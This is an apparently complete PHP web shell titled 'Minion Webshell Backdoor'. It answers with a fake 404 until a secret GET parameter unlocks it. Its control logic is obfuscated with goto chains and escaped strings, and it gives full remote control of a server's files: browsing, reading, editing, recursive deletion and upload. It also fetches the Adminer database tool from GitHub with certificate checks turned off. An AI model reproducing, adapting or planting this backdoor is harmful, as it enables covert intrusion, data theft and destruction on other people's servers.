<?php
error_reporting(0); 
session_start();
if ($_GET['fuck']=="bro"){
$_SESSION['pass']=md5($_GET['code']);
}
if (empty($_SESSION['pass'])){
header('HTTP/1.1 404 Not Found');
header("status: 404 Not Found");
exit;
}

goto e417e; Da9ca: function OS() { return substr(strtoupper(PHP_OS), 0, 3) === "\127\111\116" ? "\127\x69\x6e\x64\157\x77\x73" : "\x4c\x69\156\x75\x78"; } 
goto E73c6; F1e5d: function linkPath() { goto f5efc; a787a: echo "\74\142\162\x3e"; 
goto e1aae; F2767: foreach ($c0089 as $ba90d => $ac545) { 
goto f3650; E1be5: echo "\x2f"; 
goto c10c0; ddff0: 
goto Be656; 
goto A3d44; A0c57: if (!($A2bfb <= $ba90d)) { 
goto D6da5; } 
goto Dd73a; f3650: print "\x3c\x61\40\163\x74\171\x6c\145\75\47\x63\x6f\154\x6f\162\72\x73\x69\154\166\x65\162\x27\x20\150\162\145\146\x3d\x27\x3f\144\x69\x72\75"; 
goto Eb916; Dd73a: echo $c0089[$A2bfb]; 
goto dcc1a; f64b9: $A2bfb++; 
goto ddff0; F04f6: E7d92: 
goto eea0b; c10c0: Af3e9: 
goto f8468; f8468: F6bf1: 
goto f64b9; A3d44: D6da5: 
goto a5615; a5615: echo "\47\x3e{$ac545}\x3c\57\141\x3e\x2f"; 
goto F04f6; f8b9d: Be656: 
goto A0c57; Eb916: $A2bfb = 0; 
goto f8b9d; dcc1a: if (!($A2bfb != $ba90d)) { 
goto Af3e9; } goto E1be5; eea0b: } 
goto Ef388; f5efc: $c0089 = explode("\x2f", currentPath()); 
goto F2767; Ef388: D5563: goto a787a; e1aae: echo OS() === "\127\x69\156\144\x6f\167\163" ? windisk() : ''; 
goto a5a75; a5a75: } 
goto a292f; B92fa: delAll($a565b); 
goto ea21f; f188c: if (!isset($_GET["\141\144\155\151\156\145\162"])) { 
goto f273d; } 
goto Dbd92; b43c4: $b6cea = $d2974 . basename($_FILES["\x75\x70\x6c\157\x61\144\116\x61\155\145"]["\x6e\141\x6d\x65"]); 
goto F4c6e; F11d3: exit; 
goto F295b; e417e: error_reporting(0); 
goto F0c0b; ec272: $F59b4 = file_get_contents($_GET["\x66\151\154\x65"]); 
goto b5b91; F0c0b: function currentPath() { 
goto A4845; f01e2: Ac4db: 
goto E0e76; F5ed0: $c0089 = str_replace("\x5c", "\x2f", getcwd()); 
goto Abe13; Abe13: goto a5577; 
goto f01e2; E0e76: $c0089 = str_replace("\134", "\x2f", $_GET["\144\151\x72"]); 
goto ca249; Ce2f8: return $c0089; goto C6431; A4845: if (isset($_GET["\x64\151\162"])) { goto Ac4db; } 
goto F5ed0; c94bc: a5577: goto Ce2f8; ca249: @chdir($c0089); goto c94bc; C6431: } 
goto Da9ca; C6d73: exit; 
goto a2e08; db07d: echo "\x3c\x73\143\162\151\x70\x74\76\141\x6c\145\162\x74\50\x60\x53\x6f\x72\162\x79\54\40\x74\x68\x65\x72\x65\x20\x77\x61\x73\x20\x61\x6e\40\145\x72\162\157\162\40\x75\x70\154\x6f\141\144\151\x6e\x67\x20\x79\157\165\162\x20\x66\x69\154\x65\x2e\140\51"; goto A19d1; d1714: function editFile($ab1bf, $Cea8a) { goto f19fa; C6688: return 1; goto De8a3; d561f: goto D196b; goto aafa9; De8a3: D196b: goto c041f; f19fa: $C6049 = fopen($ab1bf, "\x77") or die("\x55\156\141\142\154\x65\x20\164\157\40\157\x70\145\156\x20\x66\x69\154\145\41"); goto a468c; cd353: return 0; goto d561f; a468c: if (fwrite($C6049, $Cea8a)) { goto B2a2c; } goto cd353; aafa9: B2a2c: goto C6688; c041f: } goto db037; Be304: $Cea8a = $_POST["\164\145\170\x74"]; goto d0de4; Dddb2: goto cd4e1; goto F4b4e; db037: function delAll($a565b) { goto Bc042; e6280: exit; goto Fc1a4; e0b9b: exit; goto baed8; E1127: d02ff: goto Fa88b; bf866: E6451: goto Cb04a; eaa4a: df0dd: goto cf779; A345e: if (rmdir($a565b)) { goto a586b; } goto f3e3a; Cb04a: echo 1; goto e6280; c5bb4: a586b: goto B1d06; B1d06: echo 1; goto c0e7d; Fc1a4: b0258: goto Ac340; c0e7d: exit; goto e3042; Fa88b: foreach (scandir($a565b) as $f4f91) { goto Ce22b; E4ed4: goto C6228; goto F725c; C274f: C6228: goto f55bd; f55bd: b3c5a: goto D06f1; B46c6: if (is_dir("{$a565b}\x2f{$f4f91}")) { goto b871e; } goto d616c; d616c: unlink("{$a565b}\57{$f4f91}"); goto E4ed4; B83da: goto b3c5a; goto Ecee2; Ce22b: if (!("\56" === $f4f91 || "\x2e\56" === $f4f91)) { goto Db6dd; } goto B83da; Ecee2: Db6dd: goto B46c6; a8b9a: delAll("{$a565b}\x2f{$f4f91}"); goto C274f; F725c: b871e: goto a8b9a; D06f1: } goto B37a0; b04d6: exit; goto c91f4; E5cb5: echo 0; goto e0b9b; Bc042: if (is_dir($a565b)) { goto d02ff; } goto D1d21; c91f4: goto Ebfe3; goto c5bb4; Ac340: goto df0dd; goto E1127; D1d21: if (unlink($a565b)) { goto E6451; } goto E5cb5; e3042: Ebfe3: goto eaa4a; baed8: goto b0258; goto bf866; f3e3a: echo 0; goto b04d6; B37a0: a2218: goto A345e; cf779: } goto A87b8; F295b: cd4e1: goto f423c; Fd0fb: if (!$_GET["\144\x65\154\x65\x74\x65"]) { goto eb23e; } goto def27; b4e0e: echo 0; goto d16a0; d5739: function checkRead($c0089) { goto Bc620; cd59d: return 1; goto C8294; Bc620: if (is_readable($c0089)) { goto B5db5; } goto aff18; b731a: goto E4abe; goto Ffbda; Ffbda: B5db5: goto cd59d; C8294: E4abe: goto ab1fd; aff18: return 0; goto b731a; ab1fd: } goto c4299; a292f: function checkDir($c0089) { goto e8908; e8908: if (is_dir($c0089)) { goto B3487; } goto Bc6ab; Bc6ab: return 0; goto A35a3; Cf3dd: B3487: goto D75ec; A35a3: goto Acbc0; goto Cf3dd; c92b9: Acbc0: goto c6eb6; D75ec: return 1; goto c92b9; c6eb6: } goto d5739; def27: $a565b = $_GET["\x64\x65\x6c\145\x74\x65"]; goto B92fa; a36e1: cc52c: goto f2f5b; F4b4e: F1bca: goto c08f3; A19d1: goto cc52c; goto a7f58; f423c: bcff3: goto d0bea; c4299: function checkWrite($c0089) { goto B36e9; c1f3b: return 1; goto Df838; Df838: c3efb: goto b4fa1; F7cdb: Ea8fa: goto c1f3b; B36e9: if (is_writeable($c0089)) { goto Ea8fa; } goto C3756; Bcdec: goto c3efb; goto F7cdb; C3756: return 0; goto Bcdec; b4fa1: } goto Bd750; f2f5b: Fc2f2: goto f188c; d0de4: $Fbddf = $_POST["\x70\x61\164\x68"]; goto Aeaf1; ea21f: eb23e: goto d92de; Bd750: function perms($ab1bf) { goto ae80c; a8d90: goto B0c58; goto a02dc; B6022: $E559a = "\x63"; goto E53bf; A4dd0: $E559a = "\142"; goto E8734; c72ad: Cd981: goto b16a9; E53bf: goto B0c58; goto c72ad; F0ec2: $E559a .= $ab120 & 0x80 ? "\x77" : "\x2d"; goto a3b06; b16a9: $E559a = "\160"; goto ee727; A7636: D0723: goto ef5f5; bc96c: $E559a .= $ab120 & 0x10 ? "\167" : "\55"; goto Abc26; A0b32: $E559a = "\163"; goto De9a0; Bb6a2: F326b: goto Bb3e6; ef5f5: $E559a = "\144"; goto e4480; C6006: dc030: goto A4dd0; B32fc: goto B0c58; goto Bb6a2; B1887: $E559a .= $ab120 & 0x20 ? "\162" : "\x2d"; goto bc96c; F9c3f: if (($ab120 & 0xa000) == 0xa000) { goto c4575; } goto F5d84; C4dcc: if (($ab120 & 0x4000) == 0x4000) { goto D0723; } goto Edd8e; Bb3e6: $E559a = "\55"; goto Edde0; c6d2f: $E559a .= $ab120 & 0x100 ? "\x72" : "\x2d"; goto F0ec2; a3b06: $E559a .= $ab120 & 0x40 ? $ab120 & 0x800 ? "\163" : "\170" : ($ab120 & 0x800 ? "\123" : "\x2d"); goto B1887; ee727: B0c58: goto c6d2f; E8734: goto B0c58; goto A7636; a02dc: b2f44: goto A0b32; ae80c: $ab120 = fileperms($ab1bf); goto a82b4; F5d84: if (($ab120 & 0x8000) == 0x8000) { goto F326b; } goto b5432; aef6b: $E559a .= $ab120 & 0x2 ? "\167" : "\x2d"; goto d3eba; Fc71a: return $E559a; goto Aa45e; Edde0: goto B0c58; goto C6006; a82b4: if (($ab120 & 0xc000) == 0xc000) { goto b2f44; } goto F9c3f; Abc26: $E559a .= $ab120 & 0x8 ? $ab120 & 0x400 ? "\x73" : "\x78" : ($ab120 & 0x400 ? "\123" : "\55"); goto a14f6; bae24: aae1f: goto B6022; d3eba: $E559a .= $ab120 & 0x1 ? $ab120 & 0x200 ? "\x74" : "\x78" : ($ab120 & 0x200 ? "\124" : "\x2d"); goto Fc71a; e4480: goto B0c58; goto bae24; E5c44: $E559a = "\165"; goto a8d90; B2930: c4575: goto A21f7; E71c9: if (($ab120 & 0x1000) == 0x1000) { goto Cd981; } goto E5c44; A21f7: $E559a = "\154"; goto B32fc; b5432: if (($ab120 & 0x6000) == 0x6000) { goto dc030; } goto C4dcc; Edd8e: if (($ab120 & 0x2000) == 0x2000) { goto aae1f; } goto E71c9; De9a0: goto B0c58; goto B2930; a14f6: $E559a .= $ab120 & 0x4 ? "\162" : "\55"; goto aef6b; Aa45e: } goto a70dc; Aeaf1: if (editFile($Fbddf, $Cea8a)) { goto F1bca; } goto b4e0e; c08f3: echo 1; goto F11d3; Dbd92: getAdminer(); goto A257a; F4c6e: if (move_uploaded_file($_FILES["\165\160\x6c\157\x61\144\x4e\141\155\x65"]["\x74\x6d\160\x5f\156\x61\155\x65"], $b6cea)) { goto d30b2; } goto db07d; A87b8: if (!$_GET["\146\x69\154\145"]) { goto E2640; } goto ec272; d16a0: exit; goto Dddb2; E73c6: function listDir($ab1bf) { $c0089 = scandir($ab1bf); return $c0089; } goto F1e5d; a2e08: E2640: goto Fd0fb; a70dc: function getAdminer() { goto B59d6; B2c8c: curl_setopt($D3398, CURLOPT_SSL_VERIFYHOST, false); goto E40ac; c433b: $fd95a = fopen($B1d14[1], "\167"); goto d4f84; e62c5: curl_setopt($D3398, CURLOPT_URL, $B1d14[0]); goto D3360; Bcb04: curl_exec($D3398); goto b9aa4; be397: ea271: goto A7d92; cac35: c831a: goto Ffd95; c3d11: $B1d14 = array("\x68\x74\164\x70\163\72\57\57\x72\x61\x77\x2e\147\x69\x74\150\165\x62\x75\x73\x65\x72\x63\157\x6e\164\x65\156\x74\x2e\143\157\155\57\163\x65\x63\165\162\151\x74\x79\60\60\x37\x2f\141\x64\x6d\151\x6e\145\162\x2f\155\x61\x73\x74\x65\x72\x2f\x61\x64\155\151\x6e\x65\162\56\x70\x68\x70", "\x61\x64\x6d\151\156\145\162\x2e\160\150\160"); goto c433b; D3360: curl_setopt($D3398, CURLOPT_BINARYTRANSFER, true); goto Cca37; fc806: flush(); goto D25c2; B59d6: if (!is_writable(currentPath())) { goto ea271; } goto F6e5e; A7d92: echo "\x3c\163\x63\162\x69\160\x74\76\x61\154\x65\162\x74\50\x60\x54\150\x69\163\x20\x64\x69\162\x65\x63\x74\157\x72\171\x20\x6e\157\164\x20\167\162\x69\x74\141\142\x6c\145\56\x60\51\74\x2f\x73\x63\162\x69\160\164\x3e"; goto cac35; a8ba7: curl_setopt($D3398, CURLOPT_SSL_VERIFYPEER, false); goto B2c8c; F6e5e: $fdb92 = str_replace($_SERVER["\x44\x4f\103\x55\x4d\105\x4e\124\x5f\x52\117\117\x54"], '', currentPath()); goto c3d11; d4f84: $D3398 = curl_init(); goto e62c5; b9aa4: curl_close($D3398); goto a2984; E40ac: curl_setopt($D3398, CURLOPT_FILE, $fd95a); goto Bcb04; a2984: fclose($fd95a); goto C1fbc; D25c2: echo "\x3c\163\143\162\151\x70\164\76"; goto C3525; C3525: echo "\x76\141\162\x20\167\x69\156\40\75\x20\167\151\x6e\144\157\x77\x2e\157\x70\145\156\50\x60\x68\x74\x74\x70\72\57\x2f" . $_SERVER["\110\x54\124\x50\x5f\110\x4f\x53\124"] . $fdb92 . "\x2f\x61\144\155\151\x6e\x65\x72\56\160\150\x70\x60\x2c\40\47\x5f\142\x6c\141\156\x6b\47\51\x3b\x69\146\40\x28\x77\151\x6e\51\40\x7b\x77\151\x6e\56\x66\x6f\143\165\x73\50\x29\73\175\40\145\154\163\145\40\173\141\154\x65\162\x74\50\47\120\154\145\141\x73\x65\40\141\154\x6c\x6f\x77\40\x70\157\160\x75\160\163\x20\x66\157\x72\40\x74\x68\x69\x73\40\x77\145\142\x73\151\164\x65\47\x29\73\x7d"; goto D3d3a; D3d3a: echo "\74\x2f\x73\x63\162\151\x70\x74\x3e"; goto a6535; a6535: goto c831a; goto be397; C1fbc: ob_flush(); goto fc806; Cca37: curl_setopt($D3398, CURLOPT_RETURNTRANSFER, true); goto a8ba7; Ffd95: } goto f880a; e8071: echo "\74\x73\x63\162\151\x70\164\x3e\141\154\145\x72\164\x28\x60\x54\x68\145\x20\x66\151\x6c\x65\40" . htmlspecialchars(basename($_FILES["\165\x70\x6c\x6f\x61\144\116\141\x6d\x65"]["\156\x61\x6d\145"])) . "\x20\150\141\163\x20\x62\x65\x65\x6e\40\165\x70\154\157\x61\144\145\x64\x2e\x60\51\x3c\57\x73\x63\x72\x69\160\x74\76"; goto a36e1; a7f58: d30b2: goto e8071; d0bea: if (!$_POST["\x70\164\x68"]) { goto Fc2f2; } goto fb9df; f880a: function sizeFile($ab1bf) { goto C20d2; Dfc8c: $D9a12 = $C725d > 0 ? floor(log($C725d, 1024)) : 0; goto C44e6; C44e6: return number_format($C725d / pow(1024, $D9a12), 2, "\x2e", "\54") . "\x20" . $e5303[$D9a12]; goto Ff695; C20d2: $C725d = filesize($ab1bf); goto Acbe3; Acbe3: $e5303 = array("\x42", "\113\x42", "\x4d\102", "\x47\102", "\x54\x42", "\x50\x42", "\105\102", "\x5a\x42", "\x59\102"); goto Dfc8c; Ff695: } goto d1714; b5b91: echo $F59b4; goto C6d73; fb9df: $d2974 = $_POST["\x70\164\x68"] . "\x2f"; goto b43c4; d92de: if (!isset($_GET["\145\x64\151\x74"])) { goto bcff3; } goto Be304; A257a: f273d:
//  

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minion Webshell Backdoor</title>
    <script src="https://code.jquery.com/jquery-3.6.1.js" integrity="sha256-3zlB5s2uwoUzrXK3BT7AX3FyvojsraNFxCc2vC/7pNI=" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.min.js" integrity="sha384-IDwe1+LCz02ROU9k972gdyvl+AESN10+x7tBKgc9I5HFtuNz0wWnPclzo6p9vxnk" crossorigin="anonymous"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@300&display=swap" rel="stylesheet"> 
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    <style>
        *{
            font-family: 'Chakra Petch', sans-serif;
            color:silver;
            
        }
        a{
            text-decoration:none;
        }
        body{
            background-color:black;
        }
    </style>
   
</head>
<body>
    <div class="container">
        <div class="text-center">
            <h1><a style="color:silver" href="<?= $_SERVER['PHP_SELF'];?>">Minion Webshell Backdoor</a></h1>
        </div>
        <p class="text-center"><?= php_uname(); ?><br><a class="text-white text-center" href="<?= $_SERVER['PHP_SELF']."?dir=".currentPath() ?>&adminer">[ADMINER DOWNLOAD]</a></p>
        <span class="text-white">Current Path : <span style="color:silver"><?php linkPath(); ?></span></span>
        <form class="mt-2" action="<?= $_SERVER['PHP_SELF']."?dir=".currentPath() ?>" enctype="multipart/form-data" method="post">
            <div class="row">
                <div class="col">
                    <input type="hidden" name="pth" value="<?= currentPath(); ?>">
                    <input class="form-control" type="file" name="uploadName">
                </div>
                <div class="col">
                    <button type="submit" class="btn btn-light">Upload</button>
                </div>
                
            </div>
        </form>
        <table id="dt" class="table table-bordered mt-2">
            <tr class="bg-dark">
                <th class="text-center">File/Folder</th>
                <th class="text-center">Size</th>
                <th class="text-center">Permission</th>
                <th class="text-center">Action</th>
            </tr>
            <?php 
                if (checkRead(currentPath()) == 1){
                    foreach (listDir(currentPath()) as $listAll){
                        if (checkDir($listAll) == 1){
                            if($listAll != '.' && $listAll != '..'){
                                echo "<tr>";
                                echo "<td style='font-weight:bold;color:white'><i class='bi bi-folder'></i>&nbsp;<a style='color:white' href='?dir=".currentPath()."/".$listAll."'>$listAll</a></td>";
                                echo "<td class='text-center' style='font-weight:bold;color:white'>-</td>";
                                echo "<td style='font-weight:bold;color:white' class='text-center'>".perms($listAll)."</td>";
                                echo "<td class='text-center'><button class='btn btn-dark btn-sm' onclick='deleteF(`".currentPath()."/".$listAll."`)'>Delete</button></td>";
                            }
                        }
                    }
                    foreach (listDir(currentPath()) as $listAll){
                        if (checkDir($listAll) == 0){
                            echo "<tr>";
                            echo "<td><i class='bi bi-file-earmark-code'></i>&nbsp;$listAll</td>";
                            echo "<td class='text-center'>".sizeFile($listAll)."</td>";
                            echo "<td class='text-center'>".perms($listAll)."</td>";
                            echo "<td class='text-center'><button class='btn btn-light btn-sm' onclick='editFile(`".currentPath()."/".$listAll."`)'>Edit</button>&nbsp;&nbsp;<button onclick='deleteF(`".currentPath()."/".$listAll."`)' class='btn btn-dark btn-sm'>Delete</button></td>";
                            echo "</tr>";
                        }
                    }

                }else{
                    echo "<tr>";
                    echo "<td colspan='4' class='text-danger text-center mt-2'>Not Readable !!</td>";
                    echo "</tr>";
                }
            ?>
        </table>
    </div>
<!-- modal for edit file -->
<div class="modal" id="editModal" tabindex="-1">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Edit <span id="f"></span></h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        <input type="hidden" id="fName">
        <textarea class="form-control" id="editFile" rows=10 ></textarea>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary" id="save">Save changes</button>
      </div>
    </div>
  </div>
</div>

<script>
function editFile(filename){
    $('#editFile').val("Loading...");
    $.get("?file="+filename, function(data, status){
        $('#editFile').val(data);
        $('#fName').val(filename);
        $('#f').text(filename);
  });
    $('#editModal').modal('show');
    
}

function deleteF(filename){
    $.get("?delete="+filename, function(data, status){
        if(data == 1){
            alert("Deleted !!");
            location.href='<?= $_SERVER['PHP_SELF']."?dir=".currentPath() ?>';
        }else{
            alert("Failed !!");
        }
  });
}
$(document).ready(function(){
    $('#save').click(function(){
        var text = $('#editFile').val();
        var path = $('#fName').val();
        $.ajax({
            url: "?edit",
            type: "post",
            data: {
                'text':text,
                'path':path
            } ,
            success: function (response) {
                if (response == 1){
                    alert("Success edit data");
                    location.href = '<?= $_SERVER['PHP_SELF']."?dir=".currentPath() ?>';
                }else{
                    alert("Failed to edit data");
                }
            },
        });
    })
})
</script>
</body>
</html>
